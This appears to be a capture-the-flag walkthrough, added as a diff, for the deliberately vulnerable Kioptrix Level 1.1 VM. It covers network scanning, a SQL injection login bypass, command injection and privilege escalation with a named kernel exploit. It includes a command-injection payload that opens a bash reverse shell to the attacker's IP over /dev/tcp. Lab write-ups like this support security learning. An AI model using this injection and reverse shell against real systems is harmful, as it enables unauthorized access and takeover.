@@ -1,0 +1,30 @@
+
+Hack The Kioptrix Level-1.1 (Boot2Root Challenge)
+
+This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+You can Download it from here and run install in your VM.
+Lets start!!
+Turn on your attacking machine and use netdiscover command to scan your local network to get target IP.
+
+So we target at 192.168.1.111 let go for its enumeration and scan open ports and protocols. With help nmap aggressive scan we have observe several open port and service running on it.
+
+Since port was 80 open so we explored target IP in the web browser and notice following login page.
+URL: http://192.168.1.111
+
+Without wasting time we try following SQL injection in the given going form.
+
+Great!!! We successfully login into Basic Administrative Web console where we found an empty text field for user input. Whenever I saw such type of scenario, I try to test it against command injection vulnerabilities.
+
+Therefore we submit ;id command to enumerate UID and GID of logged user.
+
+As result it dump apache’s UID and GID and hence by this it’s proof that this application is vulnerable to command Injection.
+
+In a new terminal we launch netcat revere connection shell to spawn victim’s tty shell. Then submit following payload as user input inside web application.
+127.0.0.1; bash -i >& /dev/tcp/192.168.1.107/8888 0>&1
+
+As soon as above payload will get submitted you get victim’s pty shell through netcat session.
+Awesome!! You can see we had access victim’s command shell inside netcat, let’s penetrate it more for root access.
+Then with help of Google we look for its Kernel exploit for privilege escalation and found Luckily “Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit” hence we can use 9542exploit for privilege escalation.
+
+B0000MM!! Here we have command shell of victim’s machine with root access.
+
